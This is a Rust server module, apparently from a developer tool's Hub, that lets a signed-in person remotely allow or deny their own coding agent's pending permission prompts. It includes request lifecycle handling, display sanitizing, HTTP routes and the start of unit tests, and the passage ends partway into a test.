//! Allowing or denying one permission prompt of a waiting session from the Hub, for the person
//! who owns that session's agent token.
//!
//! The session's hook registers the prompt it is showing (the tool, one masked display line and
//! a salted hash of the tool input, all computed on the machine) and long-polls for a decision.
//! The person's own page lists the requests and answers one. The hook accepts only an exact
//! decision for its own request id and hash and prints a fixed reply, so nothing from the Hub
//! reaches the model.
//!
//! In memory only, like the waits beside it ([`super::session_waiting`]): bounded, lost on a Hub
//! restart (a hook then reads an unknown request and leaves the prompt to the session), and never
//! written to either store, a log, a notification or a status read. A request is live only while
//! the permission wait it was made for is still the session's current wait, so a prompt answered
//! in the session, or replaced by anything else, ends it.
//!
//! A request whose hook has not polled for a minute (a sleeping or offline computer) is asleep:
//! kept, but neither listed nor answerable, since nobody would hear the answer. It is offered
//! again when that hook polls again, within the same wait and the request's 12 hours.
//!
//! A request starts `unconfirmed` and becomes `pending` only when the Hub also hears the host's
//! `permission_prompt` notification for that session. A host that runs without a person at a
//! dialog (a headless run) raises the permission request but never shows the prompt, so it never
//! sends that notification and is never offered for answering.
use std::collections::BTreeMap;
use std::sync::Mutex;
use std::time::Duration;

use axum::Router;
use axum::extract::rejection::QueryRejection;
use axum::extract::{DefaultBodyLimit, Json, Query, State};
use axum::http::StatusCode;
use axum::routing::{get, post};
use serde::{Deserialize, Serialize};
use serde_json::json;
use tokio::sync::{Notify, Semaphore};
use tokio::time::Instant;

use super::advice::invisible;
use super::coordination_http::{not_your_agent, owns_agent};
use super::http::{ApiError, Authenticated, JsonBody, blocking};
use super::login::HumanSession;
use super::session_waiting::{GRACE_SECONDS, Waiting, wait_key};
use super::store::{Principal, unix_now, validate_repository};
use super::{HubError, HubState};

/// A person may be away for hours; the hook's own bound is a little shorter than this.
const TTL_SECONDS: i64 = 12 * 60 * 60;
/// A request whose hook has not polled for this long is not offered: nobody would hear the
/// answer. It is offered again when that hook polls again (a computer back from sleep, a network
/// that is back), for as long as its wait is still the session's wait.
const HOOK_GONE_SECONDS: i64 = 60;
/// A finished request stays readable so a late answer can say what happened. One that is asleep
/// is kept for as long as it can wake.
const RETAIN_SECONDS: i64 = 120;
/// Requests this Hub holds. A session has one open request, and the waits table bounds a
/// person's waiting sessions, so there is no further bound per person or token. Past this a
/// new request is refused; the ones already waiting stay answerable.
const MAX_LIVE: usize = 1024;
/// Long polls held open at once; past it a poll answers at once.
const MAX_POLLERS: usize = MAX_LIVE;
const MAX_WAIT_SECONDS: u64 = 25;
/// What the host's notification may lead the hook's own request by.
const CONFIRM_SLACK_SECONDS: i64 = 5;
const CONFIRM_KEEP_SECONDS: i64 = 60;
const MAX_CONFIRMATIONS: usize = 1024;
const MAX_SESSION_BYTES: usize = 1024;
const MAX_AGENT_ID_BYTES: usize = 128;
const MAX_TOOL_BYTES: usize = 128;
/// Characters of the display kept; the hook cuts at the same bound.
pub const MAX_DISPLAY_CHARS: usize = 20_000;
/// What the first page written for these requests shows of a display before it cuts it, in the
/// UTF-16 units a browser counts.
const FIRST_PAGE_DISPLAY_UNITS: usize = 4000;
/// Room for a whole display in a registration: its characters may take four bytes each and
/// escape to more in JSON, past the Hub's usual body limit.
const MAX_REGISTER_BYTES: usize = 256 * 1024;
/// Characters kept of a request's one-line summary and of its folder name.
const MAX_LABEL_CHARS: usize = 200;
/// Unshown parts a request may name, and the characters kept of each name.
const MAX_UNSHOWN: usize = 16;
const MAX_UNSHOWN_CHARS: usize = 64;
/// What stands for the missing part of a request from a hook that does not say what is missing.
const UNSTATED_PART: &str = "part of the request (its computer runs an older AgentSCM)";
/// What stands for an unshown part whose own name has nothing a page can show.
const UNREADABLE_NAME: &str = "a part whose name does not show";

/// What of a request its person is not shown. They may allow it all the same: the request is
/// their own agent's, and a page says this beside its buttons.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub(super) struct Missing {
    /// Characters the request had before it was cut to the display.
    pub cut_from: Option<u64>,
    /// Secrets the machine replaced in the display.
    pub redacted: u64,
    /// Characters that do not show, which the Hub removed. Counted here, never taken from a hook.
    pub dropped: u64,
    /// Parts of the request the display leaves out, by name.
    pub unshown: Vec<String>,
}

impl Missing {
    /// What a registration says is missing. A hook from before `missing` sends `complete`; only
    /// its `true` means nothing is missing, so a hook that says neither is not taken at its word.
    fn stated(missing: Option<Self>, complete: Option<bool>) -> Self {
        match (missing, complete) {
            (Some(missing), _) => missing,
            (None, Some(true)) => Self::default(),
            (None, _) => Self {
                unshown: vec![UNSTATED_PART.into()],
                ..Self::default()
            },
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Decision {
    Allow,
    Deny,
}

impl Decision {
    fn code(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
        }
    }

    fn parse(code: &str) -> Option<Self> {
        match code {
            "allow" => Some(Self::Allow),
            "deny" => Some(Self::Deny),
            _ => None,
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Ended {
    /// Its permission wait is gone or replaced: it was answered in the session, or the session
    /// moved on.
    SessionMovedOn,
    Superseded,
    /// Its hook stopped polling. While its wait is still the session's wait the request is only
    /// asleep, and wakes when the hook polls again.
    HookGone,
    Expired,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Phase {
    /// Registered, but the host has not yet said it shows the prompt.
    Unconfirmed,
    Pending,
    Answered(Decision),
    Ended(Ended),
}

// No `Debug`: a row holds the person's tool request.
struct Pending {
    token: String,
    native: String,
    asker: Option<String>,
    owner: String,
    repository_id: Option<i64>,
    item_key: String,
    tool: String,
    summary: Option<String>,
    folder: Option<String>,
    display: String,
    missing: Missing,
    content_hidden: bool,
    input_hash: String,
    created: i64,
    last_poll: i64,
    /// When it was answered or ended.
    settled: i64,
    /// The host said it shows this prompt.
    shown: bool,
    state: Phase,
}

impl Pending {
    fn open(&self) -> bool {
        matches!(self.state, Phase::Unconfirmed | Phase::Pending)
    }

    /// It ended only because its hook went quiet, and the wait it was made for is still the
    /// session's wait: the hook may come back and be heard.
    fn asleep(&self, waiting: &Waiting, now: i64) -> bool {
        self.state == Phase::Ended(Ended::HookGone)
            && now - self.created < TTL_SECONDS
            && self.attached(waiting, now).is_some()
    }

    /// Its hook is back: a request that was only asleep is offered again. True when the request
    /// is open afterwards.
    fn wake(&mut self, waiting: &Waiting, now: i64) -> bool {
        if self.asleep(waiting, now) {
            self.state = if self.shown {
                Phase::Pending
            } else {
                Phase::Unconfirmed
            };
        }
        if self.open() {
            self.last_poll = now;
        }
        self.open()
    }

    fn end(&mut self, why: Ended, now: i64) {
        self.state = Phase::Ended(why);
        self.settled = now;
    }

    /// The start of the wait this request was made for, while that is still the session's wait.
    fn attached(&self, waiting: &Waiting, now: i64) -> Option<i64> {
        waiting
            .permission_wait(&self.token, &self.native, now)
            .filter(|(since, asker)| *since <= self.created && *asker == self.asker)
            .map(|(since, _)| since)
    }
}

#[derive(Default)]
struct Inner {
    rows: BTreeMap<String, Pending>,
    /// When the host last said it shows a permission prompt, per token and session.
    prompts: BTreeMap<(String, String), i64>,
}

impl Inner {
    /// Ends what has expired, lost its hook or lost its wait, and drops what was kept long
    /// enough. A request that is only asleep is kept for its hook's return.
    fn settle(&mut self, waiting: &Waiting, now: i64) {
        for row in self.rows.values_mut().filter(|row| row.open()) {
            if now - row.created >= TTL_SECONDS {
                row.end(Ended::Expired, now);
            } else if now - row.last_poll >= HOOK_GONE_SECONDS {
                row.end(Ended::HookGone, now);
            } else if row.attached(waiting, now).is_none() {
                row.end(Ended::SessionMovedOn, now);
            }
        }
        self.rows.retain(|_, row| {
            row.open() || now - row.settled < RETAIN_SECONDS || row.asleep(waiting, now)
        });
    }
}

/// Why a call was refused; each maps to one HTTP answer.
#[derive(Debug)]
pub(super) enum Refusal {
    Invalid(String),
    /// No current permission wait of that session, asked by that subagent.
    NotWaiting,
    Busy,
    NotFound,
    NotYours,
    AlreadyAnswered,
    AnsweredInSession,
    Ended,
    Hub(HubError),
}

impl From<HubError> for Refusal {
    fn from(error: HubError) -> Self {
        Self::Hub(error)
    }
}

type Outcome<T> = std::result::Result<T, Refusal>;

fn conflict(reason: &str, message: &str) -> ApiError {
    ApiError::new(StatusCode::CONFLICT, "request_conflict")
        .with_message(message)
        .with_field("reason", json!(reason))
}

impl From<Refusal> for ApiError {
    fn from(refusal: Refusal) -> Self {
        match refusal {
            Refusal::Invalid(message) => ApiError::invalid().with_message(message),
            Refusal::NotWaiting => conflict(
                "not_waiting",
                "That session is not waiting at a permission prompt",
            ),
            Refusal::Busy => ApiError::new(StatusCode::TOO_MANY_REQUESTS, "rate_limited")
                .with_message("Too many permission requests are open; try again shortly")
                .with_field("reason", json!("busy")),
            Refusal::NotFound => ApiError::not_found(),
            Refusal::NotYours => not_your_agent(),
            Refusal::AlreadyAnswered => conflict(
                "already_answered",
                "This request was already answered the other way",
            ),
            Refusal::AnsweredInSession => conflict(
                "answered_in_session",
                "The session moved on; it was answered there or the prompt closed.",
            ),
            Refusal::Ended => conflict("ended", "This request is over; its prompt is closed."),
            Refusal::Hub(error) => error.into(),
        }
    }
}

/// What a hook registers: the facts of one prompt, all made on the machine.
pub(super) struct Registration {
    pub session: String,
    pub agent_id: Option<String>,
    pub tool: String,
    /// One line saying what the call does, as the hook worded it.
    pub summary: Option<String>,
    /// The name of the checkout folder the session runs in.
    pub folder: Option<String>,
    pub display: String,
    pub missing: Missing,
    pub content_hidden: bool,
    pub input_hash: String,
}

impl Phase {
    /// What the hook is told: the state name and the decision, never why a request ended.
    fn parts(self) -> (&'static str, Option<&'static str>) {
        match self {
            Self::Unconfirmed => ("unconfirmed", None),
            Self::Pending => ("pending", None),
            Self::Answered(decision) => ("answered", Some(decision.code())),
            Self::Ended(_) => ("ended", None),
        }
    }
}

/// One request as its person's page sees it. Never the hash, token or session.
#[derive(Serialize)]
pub(super) struct Listed {
    item_id: String,
    request_id: String,
    tool: String,
    summary: Option<String>,
    folder: Option<String>,
    display: String,
    /// The Hub accepts an allow for every request it lists. The field tells a page this from a
    /// Hub without it, which refuses an allow unless `complete`.
    allowable: bool,
    /// What the display leaves out; a page says it beside Allow.
    missing: Missing,
    /// Nothing is missing and the display fits what the first page for these requests shows
    /// before it cuts. That page offers Allow only on this.
    complete: bool,
    content_hidden: bool,
    subagent: bool,
    since: i64,
    state: &'static str,
    decision: Option<&'static str>,
}

/// The pending permission requests of this Hub process.
pub struct Requests {
    inner: Mutex<Inner>,
    changed: Notify,
    polls: Semaphore,
}

impl Default for Requests {
    fn default() -> Self {
        Self {
            inner: Mutex::new(Inner::default()),
            changed: Notify::new(),
            polls: Semaphore::new(MAX_POLLERS),
        }
    }
}

/// Third-party text for the person's page: control and invisible characters are dropped, except
/// that line breaks stay (`\r\n` as `\n`) and a tab reads as a space. Cut at
/// [`MAX_DISPLAY_CHARS`]. Also says what the person would not see of what the machine sent: the
/// length before a cut, and how many characters were dropped. A dropped character can carry
/// words that do not show (the Unicode tag block spells ASCII invisibly) while the tool still
/// receives them.
fn sanitize_display(text: &str) -> (String, Option<u64>, u64) {
    let mut dropped = 0;
    let mut kept: String = text
        .replace("\r\n", "\n")
        .chars()
        .filter_map(|c| match c {
            '\n' => Some('\n'),
            '\t' => Some(' '),
            c if c.is_control() || invisible(c) => {
                dropped += 1;
                None
            }
            c => Some(c),
        })
        .collect();
    let chars = kept.chars().count();
    let cut = chars > MAX_DISPLAY_CHARS;
    if cut {
        kept = kept.chars().take(MAX_DISPLAY_CHARS).collect();
    }
    (kept.trim().to_owned(), cut.then_some(chars as u64), dropped)
}

fn plain_text(value: &str, max: usize) -> bool {
    !value.is_empty() && value.len() <= max && !value.chars().any(char::is_control)
}

impl Requests {
    fn lock(&self) -> Outcome<std::sync::MutexGuard<'_, Inner>> {
        Ok(self.inner.lock().map_err(|_| HubError::Busy)?)
    }

    /// Records a prompt the hook is showing. Needs the session's current permission wait, asked
    /// by the same subagent. A repeat for the same prompt returns the same request; a different
    /// prompt of the session ends the older request.
    pub(super) fn register(
        &self,
        waiting: &Waiting,
        principal: &Principal,
        registration: Registration,
        now: i64,
    ) -> Outcome<(String, Phase)> {
        if principal.read_only || now >= principal.expires_at {
            return Err(HubError::Unauthorized.into());
        }
        // The person's page finds requests by repository id; without one nobody could answer.
        if principal.repository_id.is_none() {
            return Err(Refusal::Invalid(
                "this agent token is not bound to a repository".into(),
            ));
        }
        let Registration {
            session,
            agent_id,
            tool,
            summary,
            folder,
            display,
            mut missing,
            content_hidden,
            input_hash,
        } = registration;
        let bad = |what: &str| Refusal::Invalid(format!("{what} is not acceptable"));
        if !plain_text(&session, MAX_SESSION_BYTES) {
            return Err(bad("session"));
        }
        if agent_id
            .as_deref()
            .is_some_and(|id| !plain_text(id, MAX_AGENT_ID_BYTES))
        {
            return Err(bad("agent_id"));
        }
        if tool.is_empty()
            || tool.len() > MAX_TOOL_BYTES
            || !tool
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b':' | b'-'))
        {
            return Err(bad("tool"));
        }
        if input_hash.len() != 64
            || !input_hash
                .bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
        {
            return Err(bad("input_hash"));
        }
        let (display, cut_from, dropped) = sanitize_display(&display);
        if display.is_empty() {
            return Err(bad("display"));
        }
        if missing.unshown.len() > MAX_UNSHOWN {
            return Err(bad("missing"));
        }
        // The names are the agent's own words (a tool input's keys): one clean line each. A name
        // with nothing left still stands for a part that is not shown.
        missing.unshown = missing
            .unshown
            .iter()
            .map(|name| super::advice::sanitize(name.trim(), MAX_UNSHOWN_CHARS))
            .map(|name| {
                if name.is_empty() {
                    UNREADABLE_NAME.to_owned()
                } else {
                    name
                }
            })
            .collect();
        missing.cut_from = missing.cut_from.max(cut_from);
        missing.dropped = dropped;
        // Labels beside the display: one clean line each, dropped when nothing is left.
        let label = |text: Option<String>| {
            text.map(|text| super::advice::sanitize(text.trim(), MAX_LABEL_CHARS))
                .filter(|text| !text.is_empty())
        };
        let (summary, folder) = (label(summary), label(folder));
        let mut inner = self.lock()?;
        inner.settle(waiting, now);
        match waiting.permission_wait(&principal.token_id, &session, now) {
            Some((_, asker)) if asker == agent_id => {}
            _ => return Err(Refusal::NotWaiting),
        }
        let same = |row: &Pending| {
            row.token == principal.token_id && row.native == session && row.asker == agent_id
        };
        for (id, row) in &mut inner.rows {
            if same(row) && row.input_hash == input_hash && row.wake(waiting, now) {
                return Ok((id.clone(), row.state));
            }
        }
        // A session shows one prompt at a time: its other requests are over, also one that is
        // asleep, which must not wake beside this one.
        for row in inner
            .rows
            .values_mut()
            .filter(|row| row.token == principal.token_id && row.native == session)
        {
            if row.open() || row.asleep(waiting, now) {
                row.end(Ended::Superseded, now);
            }
        }
        // A request that already waits is never ended to make room for a new one.
        if inner.rows.len() >= MAX_LIVE {
            // Finished rows only wait to answer a late click; they never crowd out a live one.
            inner.rows.retain(|_, row| row.open());
        }
        if inner.rows.len() >= MAX_LIVE {
            return Err(Refusal::Busy);
        }
        let confirmed = inner
            .prompts
            .get(&(principal.token_id.clone(), session.clone()))
            .is_some_and(|at| *at + CONFIRM_SLACK_SECONDS >= now);
        let id = super::login::random_hex()?;
        let state = if confirmed {
            Phase::Pending
        } else {
            Phase::Unconfirmed
        };
        inner.rows.insert(
            id.clone(),
            Pending {
                token: principal.token_id.clone(),
                item_key: wait_key(&principal.token_id, &session),
                native: session,
                asker: agent_id,
                owner: principal.owner.id.clone(),
                repository_id: principal.repository_id,
                tool,
                summary,
                folder,
                display,
                missing,
                content_hidden,
                input_hash,
                created: now,
                last_poll: now,
                settled: now,
                shown: confirmed,
                state,
            },
        );
        drop(inner);
        self.changed.notify_waiters();
        Ok((id, state))
    }

    /// The host showed (or is about to show) a permission prompt for `native`: its unconfirmed
    /// request becomes pending, and a request registered within a few seconds after it is
    /// confirmed on arrival.
    pub(super) fn confirm(&self, token: &str, native: &str, now: i64) {
        let Ok(mut inner) = self.inner.lock() else {
            return;
        };
        let key = (token.to_owned(), native.to_owned());
        inner
            .prompts
            .retain(|_, at| now - *at < CONFIRM_KEEP_SECONDS);
        // A full map only stops remembering a prompt that arrives before its request; the
        // requests already waiting are confirmed all the same.
        if inner.prompts.len() < MAX_CONFIRMATIONS || inner.prompts.contains_key(&key) {
            inner.prompts.insert(key, now);
        }
        let mut changed = false;
        for row in inner.rows.values_mut() {
            if row.token != token || row.native != native {
                continue;
            }
            if row.state == Phase::Unconfirmed {
                row.state = Phase::Pending;
                changed = true;
            }
            // Also for a request that is asleep, so it wakes as shown.
            if row.open() || row.state == Phase::Ended(Ended::HookGone) {
                row.shown = true;
            }
        }
        drop(inner);
        if changed {
            self.changed.notify_waiters();
        }
    }

    /// The state of a request for the hook that made it; `None` for an unknown id, another
    /// token's request or a different hash, which look alike. The call is that hook being heard:
    /// it keeps an open request live and wakes one that was asleep.
    pub(super) fn check(
        &self,
        waiting: &Waiting,
        token: &str,
        id: &str,
        hash: &str,
        now: i64,
    ) -> Option<Phase> {
        let mut inner = self.inner.lock().ok()?;
        inner.settle(waiting, now);
        let row = inner.rows.get_mut(id)?;
        if row.token != token || row.input_hash != hash {
            return None;
        }
        row.wake(waiting, now);
        Some(row.state)
    }

    /// [`Self::check`], held for up to `wait_seconds` until the state changes. A change wakes
    /// the poll at once; a gone wait is noticed within a second.
    pub(super) async fn poll(
        &self,
        waiting: &Waiting,
        token: &str,
        id: &str,
        hash: &str,
        wait_seconds: u64,
    ) -> Option<Phase> {
        let permit = self.polls.try_acquire().ok();
        let wait = if permit.is_some() { wait_seconds } else { 0 };
        let deadline = Instant::now() + Duration::from_secs(wait);
        let mut first = None;
        loop {
            // Register before reading so a change between read and wait is not missed.
            let notified = self.changed.notified();
            tokio::pin!(notified);
            notified.as_mut().enable();
            let state = self.check(waiting, token, id, hash, unix_now())?;
            let open = matches!(state, Phase::Unconfirmed | Phase::Pending);
            if !open || first.is_some_and(|first| first != state) || Instant::now() >= deadline {
                return Some(state);
            }
            first = Some(state);
            tokio::select! {
                _ = &mut notified => {},
                _ = tokio::time::sleep_until(deadline.min(Instant::now() + Duration::from_secs(1))) => {},
            }
        }
    }

    /// The agent token behind one of `owner`'s requests, for the caller to check it is still
    /// active before answering.
    pub(super) fn token_for(
        &self,
        owner: &str,
        repository_id: Option<i64>,
        id: &str,
    ) -> Outcome<String> {
        let inner = self.lock()?;
        let row = inner.rows.get(id).ok_or(Refusal::NotFound)?;
        if row.owner != owner || row.repository_id != repository_id {
            return Err(Refusal::NotYours);
        }
        Ok(row.token.clone())
    }

    /// The pending and answered requests of `owner` in one repository whose wait has lasted the
    /// grace, oldest first. Unconfirmed requests are never listed.
    pub(super) fn list(
        &self,
        waiting: &Waiting,
        owner: &str,
        repository_id: Option<i64>,
        now: i64,
    ) -> Outcome<Vec<Listed>> {
        let mut inner = self.lock()?;
        inner.settle(waiting, now);
        let mut out = Vec::new();
        for (id, row) in &inner.rows {
            if row.owner != owner || row.repository_id != repository_id {
                continue;
            }
            let (state, decision) = match row.state {
                Phase::Pending => ("pending", None),
                Phase::Answered(decision) => ("answered", Some(decision.code())),
                Phase::Unconfirmed | Phase::Ended(_) => continue,
            };
            let Some(since) = row.attached(waiting, now) else {
                continue;
            };
            if now - since < GRACE_SECONDS {
                continue;
            }
            out.push(Listed {
                item_id: format!("waiting:permission:{}", row.item_key),
                request_id: id.clone(),
                tool: row.tool.clone(),
                summary: row.summary.clone(),
                folder: row.folder.clone(),
                display: row.display.clone(),
                allowable: true,
                missing: row.missing.clone(),
                complete: row.missing == Missing::default()
                    && row.display.encode_utf16().count() <= FIRST_PAGE_DISPLAY_UNITS,
                content_hidden: row.content_hidden,
                subagent: row.asker.is_some(),
                since,
                state,
                decision,
            });
        }
        out.sort_by(|a, b| (a.since, &a.request_id).cmp(&(b.since, &b.request_id)));
        Ok(out)
    }

    /// Whether the person can answer the wait with this item key from the Hub now.
    pub(super) fn answerable(&self, waiting: &Waiting, key: &str, now: i64) -> bool {
        let Ok(mut inner) = self.inner.lock() else {
            return false;
        };
        inner.settle(waiting, now);
        inner
            .rows
            .values()
            .any(|row| row.item_key == key && row.state == Phase::Pending)
    }

    /// Records the person's decision for a pending request: the first decision wins, and the
    /// same decision again is accepted. A request shown only in part can be allowed too: it is
    /// its person's own agent's, and the list says what is missing.
    pub(super) fn answer(
        &self,
        waiting: &Waiting,
        owner: &str,
        repository_id: Option<i64>,
        id: &str,
        decision: Decision,
        now: i64,
    ) -> Outcome<Decision> {
        let mut inner = self.lock()?;
        inner.settle(waiting, now);
        let row = inner.rows.get_mut(id).ok_or(Refusal::NotFound)?;
        if row.owner != owner || row.repository_id != repository_id {
            return Err(Refusal::NotYours);
        }
        match row.state {
            Phase::Unconfirmed => Err(Refusal::NotFound),
            Phase::Pending => {
                row.state = Phase::Answered(decision);
                row.settled = now;
                drop(inner);
                self.changed.notify_waiters();
                Ok(decision)
            }
            Phase::Answered(done) if done == decision => Ok(done),
            Phase::Answered(_) => Err(Refusal::AlreadyAnswered),
            Phase::Ended(Ended::SessionMovedOn) => Err(Refusal::AnsweredInSession),
            Phase::Ended(_) => Err(Refusal::Ended),
        }
    }
}

pub fn routes() -> Router<HubState> {
    Router::new()
        .route(
            "/v1/hub/permission/register",
            post(register).layer(DefaultBodyLimit::max(MAX_REGISTER_BYTES)),
        )
        .route("/v1/hub/permission/poll", post(poll))
        .route("/v1/hub/session/permissions", get(list))
        .route("/v1/hub/session/permissions/answer", post(answer))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct HookQuery {
    repo: Option<String>,
}

/// The hook's token must be for the repository it names, as on the Hub's hook route.
fn same_repo(
    query: std::result::Result<Query<HookQuery>, QueryRejection>,
    principal: &Principal,
) -> std::result::Result<(), ApiError> {
    let Query(query) = query.map_err(|_| ApiError::invalid())?;
    if query.repo.is_some_and(|repo| repo != principal.repository) {
        return Err(ApiError::new(StatusCode::FORBIDDEN, "wrong_repository"));
    }
    Ok(())
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RegisterBody {
    session: String,
    #[serde(default)]
    agent_id: Option<String>,
    tool: String,
    #[serde(default)]
    summary: Option<String>,
    #[serde(default)]
    folder: Option<String>,
    display: String,
    #[serde(default)]
    missing: Option<Missing>,
    /// From a hook that does not say what is missing: false when some of the request is.
    #[serde(default)]
    complete: Option<bool>,
    #[serde(default)]
    content_hidden: bool,
    input_hash: String,
}

#[derive(Serialize)]
struct Registered {
    request_id: String,
    input_hash: String,
    state: &'static str,
}

async fn register(
    State(state): State<HubState>,
    Authenticated(principal): Authenticated,
    query: std::result::Result<Query<HookQuery>, QueryRejection>,
    JsonBody(body): JsonBody<RegisterBody>,
) -> std::result::Result<Json<Registered>, ApiError> {
    same_repo(query, &principal)?;
    let input_hash = body.input_hash.clone();
    let (request_id, polled) = state.onboarding.permissions().register(
        state.onboarding.waiting(),
        &principal,
        Registration {
            session: body.session,
            agent_id: body.agent_id,
            tool: body.tool,
            summary: body.summary,
            folder: body.folder,
            display: body.display,
            missing: Missing::stated(body.missing, body.complete),
            content_hidden: body.content_hidden,
            input_hash: body.input_hash,
        },
        unix_now(),
    )?;
    Ok(Json(Registered {
        request_id,
        input_hash,
        state: polled.parts().0,
    }))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct PollBody {
    request_id: String,
    input_hash: String,
    #[serde(default)]
    wait_seconds: u64,
}

#[derive(Serialize)]
struct Polled {
    request_id: String,
    input_hash: String,
    state: &'static str,
    decision: Option<&'static str>,
}

async fn poll(
    State(state): State<HubState>,
    Authenticated(principal): Authenticated,
    query: std::result::Result<Query<HookQuery>, QueryRejection>,
    JsonBody(body): JsonBody<PollBody>,
) -> std::result::Result<Json<Polled>, ApiError> {
    same_repo(query, &principal)?;
    if body.wait_seconds > MAX_WAIT_SECONDS {
        return Err(ApiError::invalid().with_message("wait_seconds must be 0..=25"));
    }
    let polled = state
        .onboarding
        .permissions()
        .poll(
            state.onboarding.waiting(),
            &principal.token_id,
            &body.request_id,
            &body.input_hash,
            body.wait_seconds,
        )
        .await
        .ok_or_else(ApiError::not_found)?;
    let (name, decision) = polled.parts();
    Ok(Json(Polled {
        request_id: body.request_id,
        input_hash: body.input_hash,
        state: name,
        decision,
    }))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RepositoryQuery {
    repository: String,
}

#[derive(Serialize)]
struct Page {
    requests: Vec<Listed>,
}

async fn list(
    State(state): State<HubState>,
    human: HumanSession,
    query: std::result::Result<Query<RepositoryQuery>, QueryRejection>,
) -> std::result::Result<Json<Page>, ApiError> {
    let Query(query) = query.map_err(|_| ApiError::invalid())?;
    let user = human.web_user()?.clone();
    validate_repository(&query.repository)?;
    // A page polls this, and it shows only the caller's own requests, so it needs the
    // repository's id alone. The answer makes the forge's role check.
    let (store, host) = (state.store.clone(), user.identity.host.clone());
    let repo = blocking(&state, move || {
        store.repository_named(&host, &query.repository)
    })
    .await?
    .ok_or_else(ApiError::not_found)?;
    let requests = state.onboarding.permissions().list(
        state.onboarding.waiting(),
        &user.id,
        Some(repo.repository_id),
        unix_now(),
    )?;
    Ok(Json(Page { requests }))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct AnswerBody {
    repository: String,
    request_id: String,
    decision: String,
}

#[derive(Serialize)]
struct Answered {
    state: &'static str,
    decision: &'static str,
}

/// A signed-in person allows or denies one prompt of their own agent. The web sign-in and its
/// CSRF token are checked by [`HumanSession`]; the agent token must still be an active token of
/// the same person.
async fn answer(
    State(state): State<HubState>,
    human: HumanSession,
    JsonBody(body): JsonBody<AnswerBody>,
) -> std::result::Result<Json<Answered>, ApiError> {
    let user = human.web_user()?.clone();
    validate_repository(&body.repository)?;
    let decision = Decision::parse(&body.decision)
        .ok_or_else(|| ApiError::invalid().with_message("decision must be allow or deny"))?;
    let repo =
        super::login::devices::mint_check(&state, &user, &body.repository, "permissions").await?;
    let requests = state.onboarding.permissions();
    let repository_id = Some(repo.repository_id);
    let token = requests.token_for(&user.id, repository_id, &body.request_id)?;
    let store = state.store.clone();
    let owner = user.id.clone();
    blocking(&state, move || {
        if owns_agent(&*store, &owner, &token, unix_now())? {
            Ok(())
        } else {
            Err(HubError::Unauthorized)
        }
    })
    .await
    .map_err(|error| match error {
        HubError::Unauthorized => not_your_agent(),
        other => other.into(),
    })?;
    let done = requests.answer(
        state.onboarding.waiting(),
        &user.id,
        repository_id,
        &body.request_id,
        decision,
        unix_now(),
    )?;
    Ok(Json(Answered {
        state: "answered",
        decision: done.code(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::hub::session_waiting::WaitReason;
    use crate::hub::store::{ForgeIdentity, User};

    const HASH: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
    const OTHER_HASH: &str = "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

    fn principal(token: &str, owner: &str, repository: &str) -> Principal {
        Principal {
            token_id: token.into(),
            name: format!("{token}-laptop"),
            repository: repository.into(),
            repository_id: Some(7),
            expires_at: i64::MAX,
            read_only: false,
            owner: User {
                id: owner.into(),
                identity: ForgeIdentity {
                    provider: "github".into(),
                    host: "github.com".into(),
                    user_id: 1,
                },
                login: owner.into(),
                name: None,
                disabled: false,
            },
        }
    }

    fn registration(session: &str, agent_id: Option<&str>, hash: &str) -> Registration {
        Registration {
            session: session.into(),
            agent_id: agent_id.map(str::to_owned),
            tool: "Bash".into(),
            summary: None,
            folder: None,
            display: "git push origin main".into(),
            missing: Missing::default(),
            content_hidden: false,
            input_hash: hash.into(),
        }
    }

    fn wait(
        waiting: &Waiting,
        who: &Principal,
        native: &str,
        reason: WaitReason,
        asker: Option<&str>,
        now: i64,
    ) {
        waiting
            .record(who, native, native, "claude", reason, asker, None, now)
            .unwrap();
    }

    /// A confirmed pending request of `mine` on session `s`, waiting since 1_000.
    fn pending(requests: &Requests, waiting: &Waiting, mine: &Principal) -> String {
        wait(waiting, mine, "s", WaitReason::Permission, None, 1_000);
        requests.confirm(&mine.token_id, "s", 1_001);
        let (id, state) = requests
            .register(waiting, mine, registration("s", None, HASH), 1_002)
            .unwrap();
        assert_eq!(state, Phase::Pending);
        id
    }

    #[test]
    fn registering_needs_the_same_permission_wait_and_a_usable_token() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let register = |p: &Principal, session, agent: Option<&str>| {
            requests
                .register(&waiting, p, registration(session, agent, HASH), 1_010)
                .map(|(_, state)| state)
        };
        assert!(matches!(
            register(&mine, "s", None),
            Err(Refusal::NotWaiting)
        ));
        wait(&waiting, &mine, "s", WaitReason::Idle, None, 1_000);
        assert!(matches!(
            register(&mine, "s", None),
            Err(Refusal::NotWaiting)
        ));
        wait(
            &waiting,
            &mine,
            "s",
            WaitReason::Permission,
            Some("sub"),
            1_001,
        );
        assert!(matches!(
            register(&mine, "s", None),
            Err(Refusal::NotWaiting)
        ));
        assert!(matches!(
            register(&mine, "s", Some("other")),
            Err(Refusal::NotWaiting)
        ));
        assert!(matches!(
            register(&mine, "s", Some("sub")),
            Ok(Phase::Unconfirmed)
        ));
        // Another token has no wait under that session name.
        let theirs = principal("tok_b", "usr_them", "acme/widgets");
        assert!(matches!(
            register(&theirs, "s", Some("sub")),
            Err(Refusal::NotWaiting)
        ));
        let mut reader = mine.clone();
        reader.read_only = true;
        assert!(matches!(
            register(&reader, "s", Some("sub")),
            Err(Refusal::Hub(HubError::Unauthorized))
        ));
    }

    #[test]
    fn registering_again_returns_the_request_and_a_new_prompt_supersedes_it() {
